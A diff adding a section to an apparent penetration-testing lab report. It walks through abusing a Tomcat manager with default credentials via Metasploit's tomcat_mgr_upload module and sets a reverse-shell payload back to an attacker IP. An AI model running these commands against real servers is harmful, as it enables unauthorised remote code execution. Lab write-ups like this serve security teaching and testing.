@@ -335,3 +335,44 @@ Host script results:
   theoretical login success.
 
 ---
+## Exploit 7: Apache Tomcat Manager Default Credentials — Malicious WAR Deployment
+
+- **Service / Port:** HTTP (Tomcat) / 8180
+- **Vulnerability:** No CVE — a weak-credential misconfiguration. The Tomcat manager application
+  is left accessible with default credentials (`tomcat`/`tomcat`), allowing any authenticated
+  manager user to deploy arbitrary web applications (WAR files) to the server, which Tomcat then
+  executes as server-side code.
+- **Tool Used:** Metasploit — exploit/multi/http/tomcat_mgr_upload
+- **Why This Tool:** Nmap identified Apache Tomcat/Coyote on port 8180. This module automates the
+  full attack chain specific to Tomcat manager abuse: authenticating with the manager interface,
+  packaging a malicious payload into a valid WAR file, uploading and deploying it through the
+  legitimate manager API, triggering execution, then cleaning up by undeploying it — a sequence
+  that would be tedious and error-prone to script manually. As with Exploit 3, the default staged
+  Meterpreter payload failed to establish a session, so it was swapped for `java/shell_reverse_tcp`,
+  a simpler single-stage payload, which succeeded.
+- **Steps:**
+  1. `nmap -sV -sC 192.168.1.3` — identified Apache Tomcat/Coyote JSP engine on port 8180 (Reconnaissance)
+  2. `msfconsole` then `search tomcat_mgr` — found `exploit/multi/http/tomcat_mgr_upload` (Weaponization)
+  3. `use exploit/multi/http/tomcat_mgr_upload`, `set RHOSTS 192.168.1.3`, `set RPORT 8180`,
+     `set HttpUsername tomcat`, `set HttpPassword tomcat`
+  4. `set PAYLOAD java/shell_reverse_tcp`, `set LHOST 192.168.1.4` — switched payload after the
+     default staged payload failed to open a session
+  5. `run` — authenticated to the manager app, uploaded and deployed a malicious WAR file, executed
+     it (Delivery/Exploitation), opening a command shell session (Installation/C2), then undeployed
+     the app to clean up
+  6. `whoami`, `id`, `uname -a` confirmed shell access as the `tomcat55` service account (Actions on Objectives)
+- **Evidence:** evidence/exploit7.png
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
+  - **Reconnaissance:** nmap identified the exposed Tomcat manager service.
+  - **Weaponization:** packaging the payload into a valid WAR file and configuring credentials/module.
+  - **Delivery:** uploading the malicious WAR file through the manager's legitimate upload API.
+  - **Exploitation:** Tomcat executing the deployed application as server-side code.
+  - **Installation:** the reverse shell establishing a running connection back to the attacker.
+  - **C2:** the open command shell session providing ongoing control of the target.
+  - **Actions on Objectives:** confirming access level via whoami/id/uname -a.
+- **Outcome / Impact:** Remote code execution as the `tomcat55` service account via legitimate
+  administrative functionality (application deployment) abused with default credentials — a
+  different attack technique from any prior exploit, since it uses a trusted admin feature rather
+  than a backdoor or a bare authentication bypass.
+
+---
